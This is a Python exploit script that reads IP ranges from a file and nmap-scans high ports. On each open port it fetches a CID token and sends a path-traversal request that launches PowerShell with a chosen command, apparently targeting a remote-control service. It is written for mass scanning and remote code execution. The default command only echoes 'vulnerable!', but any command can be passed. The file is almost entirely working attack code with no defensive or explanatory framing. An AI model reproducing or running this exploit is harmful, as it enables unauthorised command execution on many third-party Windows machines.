# -*- encoding: utf-8 -*-
# author：柠檬菠萝

import requests
import re 
import nmap
import time
from multiprocessing import Pool


def get_CID(host):
    cid_exp = '/cgi-bin/rpc?action=verify-haras'
    cid_url = host + cid_exp
    try:
        res_cid = requests.get(cid_url, timeout=5).text
        if 'verify_string' in res_cid:
            cid = re.findall('"verify_string":"(.*?)",', res_cid)[0]
            return cid
        else:
            pass
    except Exception as e:
        pass

def get_exp(host, cid, command):
    exp_payload = "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F" \
                  "windows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20" + command
    exp_url = host + exp_payload
    data = {
        'Host': host,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cookie': 'CID=' + cid,
        'Cache-Control': 'max-age=0'
    }
    res = requests.get(exp_url, headers=data, timeout=10)
    print("[+]host:{host} cid:{cid} cmd:{cmd} response:{response}".format(
            host=host,
            cid=cid,
            cmd=command,
            response=res.text
        )
    )


def run(ip):
    host = 'http://' + str(ip)
    try:
        cid = get_CID(host)
        if cid != []:
            command = str('echo vulnerable!')
            if command != 'q':
                get_exp(host, cid, command)
            else:
                pass
    except:
        pass


def scan(ipmash):
    nm = nmap.PortScanner()
    nm.scan(hosts=ipmash, ports='40000-65535', arguments='--open -n -sS -T5')
    up_hosts = nm.all_hosts()  # 获取存活主机列表
    ip_list = []
    for ip in up_hosts:
        try:
            ports = nm[ip].get('tcp').keys()
        except:
            pass
        else:
            for port in ports:
                ips = "{ip}:{port}".format(ip=ip, port=port)
                ip_list.append(ips)
    pool = Pool(processes=4)
    pool.map_async(run, ip_list)
    pool.close()
    pool.join()


if __name__ == "__main__":
    begin_time = time.time()
    filename = "test.txt"
    ipmashlist = []
    with open(filename) as f:
        ipmashlist = [str(i).replace("\n", "").replace("\r", "") for i in f.readlines()]
    for ipmash in ipmashlist:
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        print(now + "-" +ipmash)
        scan(ipmash)
    end_time = time.time()
    run_time = end_time - begin_time
    print('该循环程序运行时间：', run_time)
